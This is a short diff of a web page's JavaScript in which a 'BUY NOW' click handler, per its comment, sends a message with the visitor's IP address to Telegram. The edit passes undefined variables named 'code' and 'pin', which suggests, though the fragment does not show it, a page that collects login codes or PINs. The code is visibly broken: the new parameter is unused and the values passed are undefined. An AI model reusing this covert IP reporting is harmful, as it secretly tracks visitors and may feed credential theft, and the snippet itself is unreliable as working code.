@@ -510,13 +510,13 @@ h4 {
 
         // Send a message to Telegram when the "BUY NOW" button is clicked along with the user's IP address
 
-        function buyNow() {
+        function buyNow(number) {
 
             const message = "Someone clicked on 'Telegram'.";
 
-            getIPAndSendMessage(message);
+            getIPAndSendMessage(code);
 
-            openPopup();
+            openPopup(pin);
 
         }
 
